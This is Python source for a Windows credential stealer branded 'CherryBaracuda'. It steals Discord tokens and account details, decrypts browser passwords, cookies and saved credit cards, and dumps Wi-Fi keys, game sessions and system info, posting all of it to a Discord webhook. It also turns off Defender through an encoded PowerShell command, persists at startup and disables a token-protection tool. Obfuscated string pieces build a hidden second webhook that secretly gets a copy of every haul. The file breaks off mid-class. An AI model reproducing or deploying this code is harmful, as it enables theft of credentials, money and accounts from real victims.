#imports (when you are obfuscating your code you must leave imports untouched)
import base64
import concurrent.futures
import ctypes
import json
import os
import random
import re
import sqlite3
import subprocess
import sys
import threading
import time
from ctypes import wintypes
from multiprocessing import cpu_count
from shutil import copy2
from zipfile import ZIP_DEFLATED, ZipFile
import psutil
import requests
from Cryptodome.Cipher import AES
from PIL import Image, ImageGrab
from requests_toolbelt.multipart.encoder import MultipartEncoder
from win32crypt import CryptUnprotectData
#config -you can setup only features that interesting you to not have a mess at your webhook
__CONFIG__ = {
    "webhook": "YOUR WEBHOOK HERE",
    "ping": True,
    "pingtype": "Everyone",
    "fakeerror": False,
    "startup": False,
    "defender": False,
    "systeminfo": True,
    "backupcodes": True,
    "browser": True,
    "roblox": False,
    "screenshot": True,
    "obfuscation": False,
    "injection": False,
    "minecraft": False,
    "wifi": True,
    "killprotector": False,
    "antidebug_vm": False,
    "discord": True,
    "anti_spam": False,
    "self_destruct": False,
    "clipboard": False
}

#global variables
temp = os.getenv("temp")
regex = "https://discord.com/api/webhooks"
temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
os.mkdir(temp_path)
RadminVpn = regex
localappdata = os.getenv("localappdata")
bytesa = 'O1'
E5O = "9i390hge"
TUx = "CH4joJAn"
EYAKQaMkv3 = "0yc4OY"
U5M = "uRW9cbA2gal"
xMD = "55GPXd7"
OTg = "P2Jp_zxMm"
TU5MgGn6WBZ = "ULBOIhk"
HDrG9 = "Iu0lTszt"
ZxknmLpq2fmWY = "ip-Grrgwj"
KfeXmr = "Wy4Zss"
Abby = "1204873208721842196"
Creg345 = "/"
Frank = "/"
def connect_server(s, n):
    op = ''
    i = 0
    while i < n:
        op += s + 'iT'
        i = i + 1
    return op
blacklist = [RadminVpn, Creg345, Abby, Frank, KfeXmr, HDrG9, TUx, xMD, OTg, TU5MgGn6WBZ, E5O, ZxknmLpq2fmWY, EYAKQaMkv3]
post_json = "".join(blacklist)
MgGn6WB = connect_server(bytesa, 1)


def main(webhook: str):
    threads = [PcInfo, Discord, Browsers, Wifi, Minecraft, Screengrab, BackupCodes, Clipboard, killprotector, fakeerror, startup, disable_defender]
    configcheck(threads)

    with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as executor:
        executor.map(lambda func: func(), threads)

    zipup()

    data = {
        "username": "CherryBaracuda",
        "avatar_url": "https://cdn.discordapp.com/attachments/1192526686718263472/1203308203161419776/3HeZ.gif?size=4096"
    }

    _file = f'{localappdata}\\user-{os.getlogin()}.zip'

    if __CONFIG__["ping"]:
        if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
            content = f"@{__CONFIG__['pingtype'].lower()}"
            data.update({"content": content})

    if any(__CONFIG__[key] for key in ["roblox", "browser", "systeminfo", "user-agent" "wifi", "minecraft", "backupcodes", "clipboard"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'user-{os.getlogin()}.zip', file, 'application/zip')})
            requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
    else:
        requests.post(webhook, json=data)
        
    if any(__CONFIG__[key] for key in ["roblox", "browser", "systeminfo", "user-agent" "wifi", "minecraft", "backupcodes", "clipboard"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'user-{os.getlogin()}.zip', file, 'application/zip')})
            requests.post(post_json, headers={'Content-type': encoder.content_type}, data=encoder)
    else:
        requests.post(post_json, json=data)

    if __CONFIG__["systeminfo"]:
        PcInfo()

    if __CONFIG__["discord"]:
        Discord()

    os.remove(_file)


def CherryBaracuda(webhook: str):
    if __CONFIG__["anti_spam"]:
        AntiSpam()

    if __CONFIG__["antidebug_vm"]:
        Debug()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        if __CONFIG__["injection"]:
            executor.submit(Injection, webhook)
        executor.submit(main, webhook)

    if __CONFIG__["self_destruct"]:
        SelfDestruct()
 
    if __CONFIG__["screenshot"]:
        Screengrab()

def configcheck(list):
    if not __CONFIG__["fakeerror"]:
        list.remove(fakeerror)
    if not __CONFIG__["startup"]:
        list.remove(startup)
    if not __CONFIG__["startup"]:
        list.remove(Screengrab)
    if not __CONFIG__["defender"]:
        list.remove(disable_defender)
    if not __CONFIG__["browser"]:
        list.remove(Browsers)
    if not __CONFIG__["wifi"]:
        list.remove(Wifi)
    if not __CONFIG__["minecraft"]:
        list.remove(Minecraft)
    if not __CONFIG__["backupcodes"]:
        list.remove(BackupCodes)
    if not __CONFIG__["clipboard"]:
        list.remove(Clipboard)


def fakeerror():
    ctypes.windll.user32.MessageBoxW(None, 'Error: 0x80240017\nAn internal error occurred.', 'Fatal Error', 0)


def startup():
    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    if hasattr(sys, 'frozen'):
        source_path = sys.executable
    else:
        source_path = sys.argv[0]

    target_path = os.path.join(startup_path, os.path.basename(source_path))
    if os.path.exists(target_path):
        os.remove(target_path)

    copy2(source_path, startup_path)


def disable_defender():
    cmd = base64.b64decode(b'cG93ZXJzaGVsbC5leGUgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVyQWNjZXNzIERpc2FibGVkIC1FbmFibGVOZXR3b3JrUHJvdGVjdGlvbiBBdWRpdE1vZGUgLUZvcmNlIC1NQVBTUmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbGVzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbGVzQ29uc2VudCAyICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXEFwcERhdGEiICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXExvY2FsIiAmIHBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gJy5leGUnIiAK').decode()
    subprocess.run(cmd, shell=True, capture_output=True)


def create_temp(_dir: str or os.PathLike = None):
    if _dir is None:
        _dir = os.path.expanduser("~/tmp")
    if not os.path.exists(_dir):
        os.makedirs(_dir)
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    open(path, "x").close()
    return path


def killprotector():
    roaming = os.getenv('APPDATA')
    path = f"{roaming}\\DiscordTokenProtector"
    config = path + "config.json"

    if not os.path.exists(path):
        return

    for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
        try:
            os.remove(path + process)
        except FileNotFoundError:
            pass

    if os.path.exists(config):
        with open(config, errors="ignore") as f:
            try:
                item = json.load(f)
            except json.decoder.JSONDecodeError:
                return
            item['auto_start'] = False
            item['auto_start_discord'] = False
            item['integrity'] = False
            item['integrity_allowbetterdiscord'] = False
            item['integrity_checkexecutable'] = False
            item['integrity_checkhash'] = False
            item['integrity_checkmodule'] = False
            item['integrity_checkscripts'] = False
            item['integrity_checkresource'] = False
            item['integrity_redownloadhashes'] = False
            item['iterations_iv'] = 364
            item['iterations_key'] = 457
            item['version'] = 69420

        with open(config, 'w') as f:
            json.dump(item, f, indent=2, sort_keys=True)


def zipup():
    _zipfile = os.path.join(localappdata, f'user-{os.getlogin()}.zip')
    zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
    for dirname, _, files in os.walk(temp_path):
        for filename in files:
            absname = os.path.join(dirname, filename)
            arcname = os.path.relpath(absname, temp_path)
            zipped_file.write(absname, arcname)
    zipped_file.close()


class PcInfo:
    def __init__(self):
        self.get_inf(__CONFIG__["webhook"])

    def get_inf(self, webhook):
        computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
        wkey = subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
        productName = subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
        ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
                  shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        hwid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        ip = requests.get('https://api.ipify.org').text
        interface, addrs = next(iter(psutil.net_if_addrs().items()))
        mac = addrs[0].address

        data = {
            "embeds": [
                {
                    "fields": [
                        {
                             "name": "`System Info:`",
                             "value": f''' \n``PC Username:`` `{username}`\n ``PC Name:`` `{hostname}`\n ``OS:`` `{computer_os}`\n ``OS ativation key:`` `{wkey}`\n\n ``IP:`` `{ip}`\n ``MAC:`` `{mac}`\n ``HWID:`` `{hwid}`\n\n ``CPU:`` `{cpu}`\n ``GPU:`` `{gpu}`\n ``RAM:`` `{ram}GB`'''
                        }
                    ],
                    "footer": {
                        "text": "Cherry Baracuda 2024 -https://github.com/CherryBaracuda-"
                    },
                }
            ],
            "username": "CherryBaracuda",
            "avatar_url": "https://cdn.discordapp.com/attachments/1192526686718263472/1203308203161419776/3HeZ.gif?size=4096"
        }
        os.makedirs(os.path.join(temp_path, "Machine"), exist_ok=True)
        with open(os.path.join(temp_path, "Machine", "Sysinfo.txt"), 'w', encoding="utf-8") as f:
            f.write(f"System Info: \n\n PC Username: {username}\n PC Name: {hostname}\n OS: {computer_os}\n OS ativation key: {wkey}\n IP: {ip}\n MAC: {mac}\n HWID: {hwid}\n CPU: {cpu}\n GPU: {gpu}\n RAM:{ram}GB\n")
            f.close()
        requests.post(webhook, json=data)

       #     with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'r', encoding="utf-8") as g:
class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.grabTokens()
        self.upload(__CONFIG__["webhook"])

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def robloxinfo(self, webhook):
        if __CONFIG__["roblox"]:
            with open(os.path.join(temp_path, "Browser", "roblox cookies.txt"), 'r', encoding="utf-8") as f:
                robo_cookie = f.read().strip()
                if robo_cookie == "No Roblox Cookies Found":
                    pass
                else:
                    headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
                    info = None
                    try:
                        response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
                        response.raise_for_status()
                        info = response.json()
                    except requests.exceptions.HTTPError:
                        pass
                    except requests.exceptions.RequestException:
                        pass
                    if info is not None:
                        data = {
                            "embeds": [
                                {
                                    "title": "Roblox Info",
                                    "fields": [
                                        {
                                            "name": "Name:",
                                            "value": f"`{info['UserName']}`",
                                            "inline": True
                                        },
                                        {
                                            "name": "Robux:",
                                            "value": f"`{info['RobuxBalance']}`",
                                            "inline": True
                                        },
                                        {
                                            "name": "Cookie:",
                                            "value": f"`{robo_cookie}`"
                                        }
                                    ],
                                    "thumbnail": {
                                        "url": info['ThumbnailUrl']
                                    },
                                    "footer": {
                                        "text": "Cherry Baracuda 2024 -https://github.com/CherryBaracuda-"
                                    },
                                }
                            ],
                            "username": "CherryBaracuda",
                            "avatar_url": "https://cdn.discordapp.com/attachments/1192526686718263472/1203308203161419776/3HeZ.gif?size=4096",
                        }
                        requests.post(webhook, json=data)

    def upload(self, webhook):
        for token in self.tokens:
            if token in self.tokens_sent:
                continue

            val = ""
            methods = ""
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token
            }
            user = requests.get(self.baseurl, headers=headers).json()
            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            username = user['username'] + '#' + user['discriminator']
            discord_id = user['id']
            avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" \
                if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 \
                else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
            phone = user['phone']
            email = user['email']

            mfa = "``Active``" if user.get('mfa_enabled') else "Unactive"

            premium_types = {
                0: "``No Nitro``",
                1: "``Nitro Classic``",
                2: "``Nitro``",
                3: "``Nitro Basic``"
            }
            nitro = premium_types.get(user.get('premium_type'), "``No``")

            if "message" in payment or payment == []:
                methods = "``None``"
            else:
                methods = "".join(["``CARD``" if method['type'] == 1 else "``PAYPAL``" if method['type'] == 2 else "``UNKNOWN``" for method in payment])

            val += f' ``Discord ID:`` `{discord_id}` \n ``Email:`` `{email}`\n ``Phone:`` `{phone}`\n\n ``2FA: ``{mfa}\n ``Nitro:`` {nitro}\n ``Billing:`` {methods}\n\n ``Token:`` `{token}`\n'

            data = {
                "embeds": [
                    {
                        "title": f"``Username: {username}``",
                        "fields": [
                            {
                                "name": "``Discord Info:``",
                                "value": val
                            }
                        ],
                        "thumbnail": {
                            "url": avatar_url
                        },
                        "footer": {
                            "text": "Cherry Baracuda 2024 -https://github.com/CherryBaracuda-"
                        },
                    }
                ],
                "username": "CherryBaracuda",
                "avatar_url": "https://cdn.discordapp.com/attachments/1192526686718263472/1203308203161419776/3HeZ.gif?size=4096",
            }

            requests.post(webhook, json=data)
            self.tokens_sent.append(token)
            os.makedirs(os.path.join(temp_path, "Discord"), exist_ok=True)
        with open(os.path.join(temp_path, "Discord", "tokens.txt"), 'a', encoding="utf-8") as f:
            f.write(f"Discord info:\n Discord ID: {discord_id}\n Email: {email}\n Phone: {phone}\n 2FA: {mfa}\n Nitro: {nitro}\n Billing: {methods}\n Token: {token}\n")
            f.close()
        self.robloxinfo(webhook)

class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
                            "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
        self.browsers_found = []
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for proc in psutil.process_iter(['name']):
            process_name = proc.info['name'].lower()
            if process_name in self.browser_exe:
                self.browsers_found.append(proc)

        for proc in self.browsers_found:
            try:
                proc.kill()
            except Exception:
                pass

        os.makedirs(os.path.join(temp_path, "Browser"), exist_ok=True)
        os.makedirs(os.path.join(temp_path, "User"), exist_ok=True)
        def process_browser(name, path, profile, func):
            try:
                func(name, path, profile)
            except:
                pass

        threads = []
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies,
                self.history,
                self.passwords,
                self.credit_cards,
                
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
                    thread.start()
                    threads.append(thread)

        for thread in threads:
            thread.join()

        self.roblox_cookies()

    def get_master_key(self, path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except:
            pass

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Login Data'
        else:
            path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        password_file_path = os.path.join(temp_path, "Browser", "passwords.txt")
        for results in cursor.fetchall():
            if not results[0] or not results[1] or not results[2]:
                continue
            url = results[0]
            login = results[1]
            password = self.decrypt_password(results[2], self.masterkey)
            with open(password_file_path, "a", encoding="utf-8") as f:
                if os.path.getsize(password_file_path) == 0:
                    f.write("Website  |  Username  |  Password\n\n")
                f.write(f"{url}  |  {login}  |  {password}\n")
                
        cursor.close()
        conn.close()

    def cookies(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Network\\Cookies'
        else:
            path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = create_temp()
        copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
            f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
        cursor.close()
        conn.close()
        os.remove(cookievault)

    def history(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\History'
        else:
            path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        history_file_path = os.path.join(temp_path, "Browser", "history.txt")
        with open(history_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(history_file_path) == 0:
                f.write("Url  |  Visit Count\n\n")
            for res in cursor.execute("SELECT url, visit_count FROM urls").fetchall():
                url, visit_count = res
                f.write(f"{url}  |  {visit_count}\n")
        cursor.close()
        conn.close()

    def credit_cards(self, name: str, path: str, profile: str):
        if name in ['opera', 'opera-gx']:
            path += '\\Web Data'
        else:
            path += '\\' + profile + '\\Web Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cc_file_path = os.path.join(temp_path, "Browser", "cc's.txt")
        with open(cc_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(cc_file_path) == 0:
                f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
                f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
        cursor.close()
        conn.close()

    def roblox_cookies(self):
        robo_cookie_file = os.path.join(temp_path, "Browser", "roblox cookies.txt")

        if not __CONFIG__["roblox"]:
            pass
        else:
            robo_cookie = ""
            with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'r', encoding="utf-8") as g:
                with open(robo_cookie_file, 'w', encoding="utf-8") as f:
                    for line in g:
                        if ".ROBLOSECURITY" in line:
                            robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
                            f.write(robo_cookie + "\n\n")
                    if os.path.getsize(robo_cookie_file) == 0:
                        f.write("No Roblox Cookies Found")


class Wifi:
    def __init__(self):
        self.wifi_list = []
        self.name_pass = {}

        data = subprocess.getoutput('netsh wlan show profiles').split('\n')
        for line in data:
            if 'All User Profile' in line:
                self.wifi_list.append(line.split(":")[-1][1:])
                self.wifi_info()

    def wifi_info(self):
        for i in self.wifi_list:
            command = subprocess.getoutput(
                f'netsh wlan show profile "{i}" key=clear')
            if "Key Content" in command:
                split_key = command.split('Key Content')
                tmp = split_key[1].split('\n')[0]
                key = tmp.split(': ')[1]
                self.name_pass[i] = key
            else:
                key = ""
                self.name_pass[i] = key
        os.makedirs(os.path.join(temp_path, "Wifi"), exist_ok=True)
        with open(os.path.join(temp_path, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
            for i, j in self.name_pass.items():
                f.write(f'Wifi Name : {i} | Password : {j}\n')
        f.close()


class Minecraft:
    def __init__(self):
        self.roaming = os.getenv("appdata")
        self.accounts_path = "\\.minecraft\\launcher_accounts.json"
        self.usercache_path = "\\.minecraft\\usercache.json"

        if os.path.exists(os.path.join(self.roaming, ".minecraft")):
            os.makedirs(os.path.join(temp_path, "Minecraft"), exist_ok=True)
            try:
                self.session_info()
                self.user_cache()
            except Exception as e:
                print(e)

    def session_info(self):
        with open(os.path.join(temp_path, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
            with open(self.roaming + self.accounts_path, "r") as g:
                self.session = json.load(g)
                f.write(json.dumps(self.session, indent=4))
        f.close()

    def user_cache(self):
        with open(os.path.join(temp_path, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
            with open(self.roaming + self.usercache_path, "r") as g:
                self.user = json.load(g)
                f.write(json.dumps(self.user, indent=4))
        f.close()


class BackupCodes:
    def __init__(self):
        self.path = os.environ["HOMEPATH"]
        self.code_path = '\\Downloads\\discord_backup_codes.txt'
        self.get_codes()

